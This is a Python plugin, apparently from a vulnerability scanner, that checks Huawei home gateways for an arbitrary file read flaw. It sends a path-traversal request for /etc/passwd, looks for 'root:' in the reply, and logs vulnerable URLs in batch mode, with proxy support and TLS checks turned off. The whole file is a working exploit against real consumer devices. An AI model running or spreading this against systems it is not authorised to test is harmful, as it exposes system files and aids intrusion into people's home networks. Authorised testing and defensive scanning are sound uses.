#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()


class HUAWEI_Home_GatewayReadFileScan:

    def run(self, urls):
        url = urls + '/lib///....//....//....//....//....//....//....//....//etc//passwd'
        header = {
            "Host": urls.split("://")[-1],
            "User-Agent": self.headers,
            "Accept": "*/*",
            "Connection": "Keep-Alive"

        }
        try:
            response = requests.get(url, headers=header, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and "root:" in response.text:
                OutPrintInfoSuc("HuaWei", f'存在HuaWei任意文件读取 {url}')

                if self.batch:
                    OutPutFile("huawei_home_gateway_read_file.txt",f'存在HuaWei任意文件读取 {url}')
            else:
                if not self.batch:
                    OutPrintInfo("HuaWei", '不存在HuaWei任意文件读取')
        except Exception:
            if not self.batch:
                OutPrintInfo("HuaWei", '目标请求出错')
    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(proxy=proxy)
            self.proxy = req["proxy"]

        else:
            self.proxy = {"http": proxy, "https": proxy}

        if not self.batch:
            OutPrintInfo("HuaWei", '开始执行HuaWei任意文件读取检测...')
        self.run(url)

        if not self.batch:
            OutPrintInfo("HuaWei",'HuaWei任意文件读取检测结束')